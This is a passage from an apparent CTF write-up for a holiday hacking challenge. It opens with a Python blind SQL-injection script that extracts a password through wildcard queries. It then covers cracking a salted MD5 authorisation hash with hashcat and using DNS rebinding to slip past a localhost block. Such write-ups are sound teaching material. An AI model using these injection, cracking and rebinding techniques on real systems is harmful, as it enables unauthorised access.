out = ''
found = 0
while True:
	for c in alphabet:
		# _ (underscore) is another wildcard character in MySQL. I escaped a few other tricky characters just in case. 
		if c == '_':
			c = '\_'
		if c == '%':
			c = '\%'
		if c == '\\':
			c = '\\\\'

		# add found letters into the payload 
		tester = url % (out+c)
		# send the payload
		r = requests.get(tester)
		# parse html
		tree = html.fromstring(r.text)
		# get /picture?data=base64 URL
		url2 = tree.xpath('//img')[1].items()[1][1]
		# send second request
		r2 = requests.get(host+url2)

		# if response contains "Invalid", we have found a letter
		if "Invalid" in r2.text:
			out += c
			found = 1
			break
	print out
	if not found:
		print out
		break
	else:
		found = 0
```
Here's the output from that script:

{F1133373}

With the username/password combo of `grinchadmin` / `s4nt4sucks` I was able to log into the Attack Box and retrieve the flag!

{F1133376}

##Flag #12 - Grinch Network Attack Server
>He spoke not a word, but went straight to his hack,
>He had found the IPs and started the attack!
>Do or Die! We must now lend Santa our aid
>To take down Grinch Networks and save the day!

Thankfully, the hardest was not saved for last! While this flag was more straightforward, I definitely struggled finding the initiial foothold. I tried just about everything but using hashcat to crack a password acting as a salt!

Thanks to our ragtag #grincharmy team, we were able to find flag 12 and take down Grinch Networks to save Christmas. 
 - Max, @mava
 - castilho, https://twitter.com/castilho101
 - h3x0ne, https://twitter.com/h3xone
 - d3f4u17, https://twitter.com/_d3f4u17_
 - Panya, https://github.com/panya
 - chron0x, https://twitter.com/chron0x1

Here's how we did it:

###Summary:
The Attack Box is set up to target and launch DDoS attacks against three of Santa's IP's. These attacks can be launched by clicking "Attack" which triggers a request like the following:

https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==

This launches a spookily realistic attack on the targeted IP! (sorry Santa!)

the `payload` parameter decoded is 

```json
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```
Argh! *another* hash! The last one in Flag 11 gave us headaches plenty. In order to stop the Grinch, we had to point the target at itself so the network would take itself down. 

###Feeling Salty

Try as we might, we couldn't find any way to bypass the hash protection. I did find that `-` could be used in the target without triggering an error, indicating a domain could be passed as a target - but we'll talk more about that soon. 

The suggestion of hashcat was brought up and we started to see if we could crack whatever was being used to authorize the IP addresses. The assumption that the authentication hash was generated in one of two ways:
 - md5(password + ip)
 - md5(ip + password)

There's not an exact command line argument in hashcat for this specific situation, but there are two modes that are similar enough to work:

```
- [ Hash modes ] -

      # | Name                                             | Category
  ======+==================================================+======================================
    900 | MD4                                              | Raw Hash
      0 | MD5                                              | Raw Hash
  ...
     10 | md5($pass.$salt)                                 | Raw Hash, Salted and/or Iterated
     20 | md5($salt.$pass)                                 | Raw Hash, Salted and/or Iterated
``` 
After some tweaking and testing, we found that attack mode 10 worked! The authenticated hash was being generated with `md5('mrgrinch463'+ip)`

hashcat command
```
hashcat -m 10 -O 5f2940d65ca4140cc18d0878bc398955:203.0.113.33 rockyou.txt --force
```
Output:
```
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: md5($pass.$salt)
Hash.Target......: 5f2940d65ca4140cc18d0878bc398955:203.0.113.33
Time.Started.....: Mon Dec 28 21:10:03 2020 (2 secs)
Time.Estimated...: Mon Dec 28 21:10:05 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:  2218.0 kH/s (0.96ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 5352547/14344385 (37.31%)
Rejected.........: 1123/5352547 (0.02%)
Restore.Point....: 5349475/14344385 (37.29%)
Candidates.#1....: mrkitty18 -> mrbrln07
HWMon.Dev.#1.....: N/A
```

###DNS Rebinding
With the password cracked, all we had to do now what make an authentication hash for `127.0.0.1` right?? WRONG!

Here's the hash:
md5('mrgrinch463127.0.0.1') == 3e3f8df1658372edf0214e202acb460b

Here's the payload:
{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}

Here's the launch URL:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==

But here's the issue: "Local target detected, aborting attack"

{F1133394}

We know domains can be used in the `target` field since dashes are allowed. The first thing that comes to mind is a DNS Rebinding attack. The site http://1u.ms/ has a succint explanation that details why this would work in this case:

> DNS rebinding is a well-known technique targeting TOCTOU (Time-of-check to time-of-use) type of vulnerabilities during IP blacklisting or whitelisting. It is performed using a domain that resolves in a legit IP during the first request (check) and to the forbidden one during the second request (use).

In our case, we'd like to craft a domain that resolves to `203.0.113.213` for the check and then the localhost `127.0.0.1` when the attack is launched. 

We can make a domain that behaves like this using a this tool: https://lock.cmpxchg8b.com/rebinder.html

{F1133407}

And now we have this domain which randomly resolve to either 127.0.0.1 or 203.0.113.213: `cb0071d5.7f000001.rbndr.us`. This took a few times to work because we have to win two "coin flips" of the IP pointing to 203.0.113.213 first and then 127.0.0.1 for the actual attack.

With a domain prepared, we can relaunch the attack! 

Here's the hash:
md5('mrgrinch463cb0071d5.7f000001.rbndr.us') == 51a799c562ed548d5ce9c8f4d1e71455

Here's the payload:
{"target":"cb0071d5.7f000001.rbndr.us","hash":"51a799c562ed548d5ce9c8f4d1e71455"}

Here's the launch URL:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiJjYjAwNzFkNS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI1MWE3OTljNTYyZWQ1NDhkNWNlOWM4ZjRkMWU3MTQ1NSJ9

After a few tries, the rebinding attack works and we've DDoS'd  Grinch Networks and saved the holidays!

{F1133408}

## Epilogue
I'm glad that we saved Christmas but I'm sad that it's over. These were 12 fantastic challenges - and they were a challenge in every sense of the word. I look forward to more CTF's made by Adam in the future! 

>Grinch sprang to his sleigh, to Max he gave a whistle,
>And away they all flew like the down of a thistle.
>But I heard him exclaim, ere he drove out of sight—
>“Happy Hackmas to all, and to all a good night!”

@bendtheory

## Impact

The Grinch *could* have stolen Christmas! Were it not for the dozen or holes identified in his Network. I hear his IT guy - Adam? - is in world of trouble right now.

## Attachments
- Flag_1.PNG
- Flag_2.PNG
- Flag_2.1.PNG
- Flag_3.PNG
- Flag_4.PNG
- Flag_5.1.PNG
- Flag_5.2.PNG
- Flag_5.3.PNG
- Flag_5.4.PNG
- xxx.png
- Flag_6.PNG
- Flag_7.1.PNG
- Flag_7.2.PNG
- Flag_7.3.PNG
- Flag_7.4.PNG
- Flag_8.1.PNG
- Flag_8.2.PNG
- Flag_8.3.PNG
- Flag_8.4.PNG
- Flag_8.5.PNG
- Flag_8.6.PNG
- Flag_9.2.PNG
- Flag_10.1.PNG
- Flag_10.2.PNG
- Flag_10.3.PNG
- Flag_10.4.PNG
- Flag_11.1.PNG
- Flag_11.2.PNG
- Flag_11.3.PNG
- Flag_9.1.PNG
- Flag_9.3.PNG
- Flag_11.4.PNG
- Flag_11.5.PNG
- Flag_11.6.PNG
- Flag_12.1.PNG
- Flag_12.3.PNG
- Flag_12.2.PNG
